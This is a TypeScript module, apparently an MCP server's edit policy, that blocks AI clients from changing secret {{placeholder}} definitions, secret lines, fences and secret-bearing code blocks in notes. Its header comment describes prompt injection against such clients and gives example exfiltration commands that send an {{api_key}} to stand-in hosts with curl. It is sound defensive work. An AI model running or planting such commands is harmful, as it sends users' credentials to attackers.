// MCP edits and {{placeholders}}. In One a placeholder is filled with the user's values, secrets included,
// when they copy or run a code block (any form markdown-it calls a `fence` or `code_block`: top level,
// indented, in a blockquote, in a list item). A client must not plant a reference or bend what one
// resolves to (prompt injection: "curl https://x/?k={{api_key}}", or point {{url}} somewhere else):
//  1. Definitions are off limits: the variables file (setting variables.fileName, any folder), a note's
//     frontmatter `vars` / `target` / `env` / `secrets` (compared as parsed, the way the app reads them;
//     quoted, explicit or otherwise unusual keys for these names are refused), fence `{…}` attributes.
//  2. Secret lines are frozen, note-wide and without a markdown parse: no edit may add or change a line that
//     holds a secret placeholder (prose, any block form, frontmatter), nor add an occurrence of one, and the
//     lines directly above and below each one stay exactly as they are (existing or not). That alone keeps
//     any block grammar from turning a secret line into a new code block (`$$x$$` above, a line below).
//  3. Code-block structure around secrets (also without a parse): the fence lines (``` / ~~~, any
//     container) up to the last secret line stay exactly as they are, so a secret line cannot be wrapped
//     into a block. Blocks added after it are fine: no later line makes an earlier one code.
//  4. The blocks One runs (markdown-it with One's own block rules, as the preview parses them): a block
//     holding a secret cannot change at all, not even a line without one (`export T={{api_key}}` …
//     `curl -H "$T" https://evil`).
// Residual: a NEW block without placeholders may still use a shell variable a frozen block exported.
// Secret = a name in `secrets:`, a vault value (`vault` / `vault:<key>`: vars, env vars, target fields as
// `T.field` and the bare field, note frontmatter vars), a value that uses a secret, and any name nothing
// defines (One fills those from remembered form values). No variables file between the note and the share
// root (or one that does not parse) → every name is secret. Built-ins ({{date}} {{time}} {{title}}
// {{target}} {{env}}) stay free unless a definition shadows them. Mirrors the app's rules
// (renderer/variables/parse.ts, resolve.ts) without importing them: the server must not reach them.
import { isMap, isScalar, parse as parseYaml, parseDocument } from 'yaml';
import { useOneBlockRules } from '../shared/md-block-rules';
import { isMarkdown } from '../shared/paths';
import { ToolError } from './protocol';

export const BUILTIN_NAMES: ReadonlySet<string> = new Set(['date', 'time', 'title', 'target', 'env']);
/** The app's PLACEHOLDER_RE (renderer/variables/resolve.ts). `\s*` may span lines: matched on the whole text. */
const PLACEHOLDER = /\{\{\s*([A-Za-z_][\w.-]*)\s*(?::[^{}\n]*)?\}\}/g;
const VAULT_REF = /^(?:vault(?::.+)?|🔒|\*{3,}|•{3,})$/u;
/** A fence line in any container (top level, `> `, list indentation): a run of 3+ backticks or tildes. */
const FENCE_RUN = /`{3,}|~{3,}/;
const TOP_FENCE = /^ {0,3}(`{3,}|~{3,})(.*)$/;
const DEFINING_KEYS = new Set(['vars', 'target', 'env', 'secrets']);

export interface SecretScope {
  /** Does a placeholder name count as secret here? */
  isSecret(name: string): boolean;
  failClosed: boolean;
}

const lower = (s: string) => s.toLowerCase();
export const placeholderNames = (text: string) => (text.indexOf('{{') === -1 ? [] : [...text.matchAll(PLACEHOLDER)].map((m) => m[1]));

/** The app's frontmatterRegion (parse.ts): `---` on the first line, up to the next `---` / `...` line. */
function frontmatterRegion(text: string): { from: number; to: number } | null {
  if (!/^---[ \t]*\r?\n/.test(text)) return null;
  const start = text.indexOf('\n') + 1;
  const m = /^(?:---|\.\.\.)[ \t]*\r?$/m.exec(text.slice(start));
  return m ? { from: start, to: start + m.index } : null;
}
const frontmatterOf = (text: string) => {
  const r = frontmatterRegion(text);
  return r ? text.slice(r.from, r.to) : null;
};

/** The YAML data of a variables file: its first ```yaml block, else its frontmatter. */
function yamlOf(text: string): string | null {
  const lines = text.split('\n').map((l) => l.replace(/\r$/, ''));
  let open: { ch: string; len: number; yaml: boolean; from: number } | null = null;
  for (let i = 0; i < lines.length; i++) {
    const m = TOP_FENCE.exec(lines[i]);
    if (!open) {
      if (m) open = { ch: m[1][0], len: m[1].length, yaml: /^[ \t]*(yaml|yml)\b/i.test(m[2]), from: i + 1 };
    } else if (m && m[1][0] === open.ch && m[1].length >= open.len && !m[2].trim()) {
      if (open.yaml) return lines.slice(open.from, i).join('\n');
      open = null;
    }
  }
  if (open?.yaml) return lines.slice(open.from).join('\n');
  return frontmatterOf(text);
}

const isObj = (v: unknown): v is Record<string, unknown> => !!v && typeof v === 'object' && !Array.isArray(v);
const scalar = (v: unknown) => (typeof v === 'string' || typeof v === 'number' || typeof v === 'boolean' ? String(v) : null);

/**
 * The secret names for a note, from its nearest variables file (`varsText`, null = none: fail closed) and
 * its own frontmatter. Secret names compare case-insensitively (stricter); "defined" ones exactly, as the
 * app looks them up.
 */
export function secretScope(varsText: string | null, noteText: string): SecretScope {
  let fm: unknown;
  try {
    const nf = frontmatterOf(noteText);
    fm = nf === null ? {} : parseYaml(nf);
  } catch {
    return closedScope(null); // a note frontmatter that does not parse: trust nothing
  }
  const noteVars = isObj(fm) && isObj(fm.vars) ? fm.vars : {};
  if (varsText === null) return closedScope(noteVars);
  let data: unknown;
  try {
    const y = yamlOf(varsText);
    data = y === null ? {} : parseYaml(y);
  } catch {
    return closedScope(noteVars); // a file that does not parse defines nothing we can trust
  }
  const secret = new Set<string>();
  const values = new Map<string, string[]>(); // exact name → plain values
  const value = (name: string, v: string) => values.set(name, [...(values.get(name) ?? []), v]);
  const addVars = (m: unknown) => {
    if (!isObj(m)) return;
    for (const [k, v] of Object.entries(m)) {
      const s = scalar(v);
      if (s === null) secret.add(lower(k)); // a map / list / null: no plain value → treated as secret
      else if (VAULT_REF.test(s.trim())) secret.add(lower(k));
      else value(k, s);
    }
  };
  const addTargets = (m: unknown) => {
    if (!isObj(m)) return;
    for (const [t, fields] of Object.entries(m)) {
      if (!isObj(fields)) continue;
      for (const [f, v] of Object.entries(fields)) {
        const s = scalar(v);
        if (s === null || VAULT_REF.test(s.trim())) {
          secret.add(lower(`${t}.${f}`));
          secret.add(lower(f));
        } else {
          value(`${t}.${f}`, s);
          value(f, s);
        }
      }
    }
  };
  const addSecrets = (v: unknown) => {
    const items = Array.isArray(v) ? v : v === undefined || v === null ? [] : [v];
    for (const it of items) {
      const s = scalar(it);
      if (!s) continue;
      for (const name of s.split(/[\s,]+/).filter(Boolean)) {
        secret.add(lower(name));
        if (name.includes('.')) secret.add(lower(name.slice(name.indexOf('.') + 1)));
      }
    }
  };
  if (isObj(data)) {
    addVars(data.vars);
    addTargets(data.targets);
    addSecrets(data.secrets);
    if (isObj(data.envs))
      for (const env of Object.values(data.envs)) {
        if (!isObj(env)) continue;
        addVars(env.vars);
        addTargets(env.targets);
        addSecrets(env.secrets);
      }
  }
  addVars(noteVars);
  if (isObj(fm)) addSecrets(fm.secrets);
  const isSecret = (name: string): boolean => {
    const n = lower(name);
    if (secret.has(n) || (n.includes('.') && secret.has(n.slice(n.lastIndexOf('.') + 1)))) return true;
    if (values.has(name)) return false;
    return !BUILTIN_NAMES.has(name); // nothing defines it: One fills it from remembered form values
  };
  // Closure: a value that uses a secret (or an undefined name) makes its name secret too.
  for (let grew = true; grew; ) {
    grew = false;
    for (const [name, vs] of values) {
      if (secret.has(lower(name))) continue;
      if (vs.some((v) => placeholderNames(v).some(isSecret))) {
        secret.add(lower(name));
        grew = true;
      }
    }
  }
  return { isSecret, failClosed: false };
}

/** No usable variables file: every name is secret but the built-ins the note does not redefine. */
function closedScope(noteVars: Record<string, unknown> | null): SecretScope {
  const shadow = noteVars === null ? null : new Set(Object.keys(noteVars).map(lower));
  return { isSecret: (name) => !(BUILTIN_NAMES.has(name) && shadow !== null && !shadow.has(lower(name))), failClosed: true };
}

// ---- layer 1: definitions ---------------------------------------------------------------------------

/**
 * The note's `vars` / `target` / `env` / `secrets` as the app reads them (yaml parseDocument, keys by
 * their scalar value, the first of duplicates), as a stable string; `{ odd }` when the frontmatter does not
 * parse or writes one of these keys in an unusual way (quoted, `? key`, flow map, duplicate, other case).
 */
export function definingMeta(text: string): { value: string } | { odd: string } {
  const region = frontmatterRegion(text);
  if (!region) return { value: '' };
  const src = text.slice(region.from, region.to);
  try {
    const doc = parseDocument(src, { uniqueKeys: false, prettyErrors: false });
    if (doc.errors.length) return { odd: 'does not parse' };
    if (!isMap(doc.contents)) return /\b(vars|target|env|secrets)\b/i.test(src) ? { odd: 'is not a plain map' } : { value: '' };
    const js = doc.toJS({ maxAliasCount: 50 }) as Record<string, unknown>;
    const out: Record<string, unknown> = {};
    for (const pair of doc.contents.items) {
      if (!isScalar(pair.key)) {
        if (/\b(vars|target|env|secrets)\b/i.test(JSON.stringify(pair.key ?? ''))) return { odd: 'uses a complex key' };
        continue;
      }
      const k = String(pair.key.value ?? '');
      if (!DEFINING_KEYS.has(lower(k.trim()))) continue;
      const r = pair.key.range;
      const lineStart = r ? src.lastIndexOf('\n', r[0] - 1) + 1 : -1;
      // Exactly `vars:` at the start of its line: anything else is a second spelling a reviewer would miss.
      if (pair.key.type !== 'PLAIN' || !r || r[0] !== lineStart || src.slice(r[0], r[1]) !== k || !DEFINING_KEYS.has(k)) return { odd: `writes "${k.trim()}" in an unusual way` };
      if (k in out) return { odd: `has "${k}" twice` };
      out[k] = js[k] ?? null;
    }
    return { value: stable(out) };
  } catch {
    return { odd: 'does not parse' };
  }
}

/** JSON with object keys sorted at every level (two parses of the same data compare equal). */
function stable(v: unknown): string {
  if (Array.isArray(v)) return `[${v.map(stable).join(',')}]`;
  if (v && typeof v === 'object') return `{${Object.keys(v as object).sort().map((k) => `${JSON.stringify(k)}:${stable((v as Record<string, unknown>)[k])}`).join(',')}}`;
  return JSON.stringify(v ?? null);
}

/** Fence lines with `{…}` attributes (they set target / env / vars for their block), any container: like
 *  the app's parseFenceInfo, a `{` anywhere in the info string counts (also after a `~`). */
const attributeLines = (text: string) => lines(text).filter((l) => /(?:`{3,}|~{3,}).*\{/.test(l));

// ---- layers 2 and 3: secret lines and fence lines, without a parse ---------------------------------------

const lines = (text: string) => text.split('\n').map((l) => (l.endsWith('\r') ? l.slice(0, -1) : l));

/** Line numbers a placeholder touches (it may span lines), and its name. Matched with each line's container
 *  prefix (indentation, `>`) taken off, as a blockquote's or list's code block reaches One: `{{` / `> api_key}}`
 *  is one placeholder there. Same line count, so the numbers hold for the raw text. */
function hits(raw: string): Array<{ name: string; first: number; last: number }> {
  if (raw.indexOf('{{') === -1) return [];
  const text = raw.replace(/^[ \t>]+/gm, '');
  const starts = [0];
  for (let i = text.indexOf('\n'); i !== -1; i = text.indexOf('\n', i + 1)) starts.push(i + 1);
  const lineOf = (pos: number) => {
    let lo = 0;
    let hi = starts.length - 1;
    while (lo < hi) {
      const mid = (lo + hi + 1) >> 1;
      if (starts[mid] <= pos) lo = mid;
      else hi = mid - 1;
    }
    return lo;
  };
  return [...text.matchAll(PLACEHOLDER)].map((m) => ({ name: m[1], first: lineOf(m.index!), last: lineOf(m.index! + m[0].length - 1) }));
}

/** The lines that hold a secret placeholder (a multiset: one entry per line), each with its neighbours
 *  (`null` = none: start / end of the file), the secret names' counts, and the fence lines from the top
 *  down to the last secret line. */
export function secretLines(text: string, scope: SecretScope): { lines: string[]; context: string[]; names: Map<string, number>; fencesAbove: string[] } {
  const all = lines(text);
  const touched = new Set<number>();
  const names = new Map<string, number>();
  for (const h of hits(text)) {
    if (!scope.isSecret(h.name)) continue;
    for (let i = h.first; i <= h.last; i++) touched.add(i);
    names.set(lower(h.name), (names.get(lower(h.name)) ?? 0) + 1);
  }
  const order = [...touched].sort((a, b) => a - b);
  const fencesAbove = order.length ? all.slice(0, order[order.length - 1] + 1).filter((l) => FENCE_RUN.test(l)) : [];
  // A final newline ends the last line; it is not an empty line below it (appending there must count).
  const n = all.length - (text.endsWith('\n') ? 1 : 0);
  const context = order.map((i) => JSON.stringify([i > 0 ? all[i - 1] : null, all[i], i + 1 < n ? all[i + 1] : null]));
  return { lines: order.map((i) => all[i]), context, names, fencesAbove };
}

const counts = (xs: readonly string[]) => {
  const m = new Map<string, number>();
  for (const x of xs) m.set(x, (m.get(x) ?? 0) + 1);
  return m;
};
/** Is every element of `b` in `a` at least as often? */
const within = (b: readonly string[], a: readonly string[]) => {
  const have = counts(a);
  for (const [x, n] of counts(b)) if ((have.get(x) ?? 0) < n) return false;
  return true;
};
const sameMultiset = (a: readonly string[], b: readonly string[]) => a.length === b.length && within(a, b);

/**
 * Layer 2 (no parse): every line of `after` that holds a secret placeholder was in `before` as it is, and no
 * secret name occurs more often. Returns why not, or null.
 */
export function lineRuleProblem(before: string, after: string, scopeBefore: SecretScope, scopeAfter: SecretScope): string | null {
  const b = secretLines(before, scopeBefore);
  const a = secretLines(after, scopeAfter);
  if (!within(a.lines, b.lines)) return 'adds or changes a line that uses a secret {{placeholder}}';
  for (const [n, k] of a.names) if (k > (b.names.get(n) ?? 0)) return `adds a use of the secret {{${n}}}`;
  if (!within(a.context, b.context)) return 'adds, changes or removes a line right next to a line that uses a secret {{placeholder}}';
  return null;
}

/** Layer 3 (no parse): the fence lines (any container) down to the last secret line stay as they are. */
export function fenceRuleProblem(before: string, after: string, scopeBefore: SecretScope, scopeAfter: SecretScope): string | null {
  const a = secretLines(after, scopeAfter);
  if (!a.lines.length) return null;
  const b = secretLines(before, scopeBefore).fencesAbove;
  return b.length === a.fencesAbove.length && b.every((x, i) => x === a.fencesAbove[i]) ? null : 'adds, removes or changes a code fence above a line that uses a secret {{placeholder}}';
}

// ---- layer 4: the blocks One runs, as markdown-it parses them --------------------------------------------

type Md = { parse(src: string, env: object): Array<{ type: string; map: [number, number] | null; content: string }> };
let md: Promise<Md> | null = null;
/** One's preview: markdown-it with html on, footnotes and One's block rules (preview/markdown.ts). Block level only. */
function markdown(): Promise<Md> {
  return (md ??= (async () => {
    const [{ default: MarkdownIt }, { default: footnote }] = await Promise.all([import('markdown-it'), import('markdown-it-footnote')]);
    const m = useOneBlockRules(new MarkdownIt({ html: true, linkify: false, typographer: false }).use(footnote));
    m.core.ruler.disable(['inline', 'linkify', 'replacements', 'smartquotes', 'text_join'], true);
    return m as unknown as Md;
  })());
}

/** The source lines of every `fence` / `code_block` (any container) that holds a secret; a code file is one block. */
export async function secretBlocks(path: string, text: string, scope: SecretScope): Promise<string[]> {
  if (text.indexOf('{{') === -1) return [];
  const holds = (s: string) => placeholderNames(s).some((n) => scope.isSecret(n));
  if (!isMarkdown(path)) return holds(text) ? [text] : [];
  const norm = text.replace(/\r\n?/g, '\n'); // markdown-it's own normalization: its line numbers count these
  const all = norm.split('\n');
  const out: string[] = [];
  for (const t of (await markdown()).parse(norm, {})) {
    if ((t.type !== 'fence' && t.type !== 'code_block') || !t.map) continue;
    const src = all.slice(t.map[0], t.map[1]).join('\n');
    if (holds(src) || holds(t.content)) out.push(src); // content: the block as One runs it (prefixes off)
  }
  return out;
}

export const isVarsFile = (path: string, fileName: string) => lower(path.slice(path.lastIndexOf('/') + 1)) === lower(fileName.trim() || 'variables.md');

const refuse = (why: string, scope: SecretScope) =>
  new ToolError('ESECRET', `The edit ${why}${scope.failClosed ? ' (no variables file covers this note, so every {{name}} but the built-ins counts as secret)' : ''}. In One those fill in the user's secrets when a block is copied or run: AI apps leave them as they are. Ask the user to make this change.`);

/**
 * Throws ESECRET when an edit of `path` (from `before`, under `scopeBefore`, to `after` at `newPath`,
 * under `scopeAfter`) touches a placeholder definition, a secret line, the fences of a note with secrets or
 * a block that holds a secret. A move passes the same text with the scopes of both places.
 */
export async function checkPlaceholderPolicy(o: { path: string; newPath?: string; before: string; after: string; scopeBefore: SecretScope; scopeAfter: SecretScope; fileName: string }): Promise<void> {
  const dest = o.newPath ?? o.path;
  if (isVarsFile(o.path, o.fileName) || isVarsFile(dest, o.fileName)) throw new ToolError('ESECRET', `AI apps cannot change variables files (${o.fileName}): they define the values {{placeholders}} fill in.`);
  if (isMarkdown(o.path) || isMarkdown(dest)) {
    const fb = frontmatterOf(o.before);
    const fa = frontmatterOf(o.after);
    if (fb !== fa) {
      const mb = definingMeta(o.before);
      const ma = definingMeta(o.after);
      if ('odd' in ma) throw new ToolError('ESECRET', `AI apps cannot write this frontmatter: it ${ma.odd}. Keys vars, target, env and secrets define what {{placeholders}} fill in.`);
      if (('odd' in mb ? '' : mb.value) !== ma.value) throw new ToolError('ESECRET', 'AI apps cannot change the frontmatter keys vars, target, env or secrets: they define what {{placeholders}} fill in.');
    }
    const ab = attributeLines(o.before);
    const aa = attributeLines(o.after);
    if (ab.length !== aa.length || ab.some((x, i) => x !== aa[i])) throw new ToolError('ESECRET', 'AI apps cannot change code-block {…} attributes (target, env, vars): they define what {{placeholders}} fill in.');
  }
  if (o.before.indexOf('{{') === -1 && o.after.indexOf('{{') === -1) return;
  const why = lineRuleProblem(o.before, o.after, o.scopeBefore, o.scopeAfter) ?? (isMarkdown(dest) ? fenceRuleProblem(o.before, o.after, o.scopeBefore, o.scopeAfter) : null);
  if (why) throw refuse(why, o.scopeAfter);
  let blocks: [string[], string[]];
  try {
    blocks = await Promise.all([secretBlocks(o.path, o.before, o.scopeBefore), secretBlocks(dest, o.after, o.scopeAfter)]);
  } catch {
    throw new ToolError('ESECRET', 'The {{placeholder}} rules could not check this edit: ask the user to make it.');
  }
  if (!sameMultiset(blocks[0], blocks[1])) throw refuse('changes a code block that uses a secret {{placeholder}}', o.scopeAfter);
}
